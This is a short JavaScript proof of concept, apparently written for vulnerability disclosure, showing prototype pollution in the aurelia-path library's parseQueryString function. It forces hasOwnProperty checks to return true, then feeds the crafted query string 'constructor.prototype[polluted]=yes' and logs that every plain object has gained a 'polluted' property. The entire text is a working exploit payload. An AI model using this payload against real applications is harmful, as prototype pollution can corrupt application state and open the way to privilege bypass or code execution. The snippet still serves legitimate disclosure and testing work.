Object.prototype.hasOwnProperty.call = () => true;
const ap = require('aurelia-path');
console.log({}.polluted);
ap.parseQueryString('constructor.prototype[polluted]=yes');
console.log({}.polluted);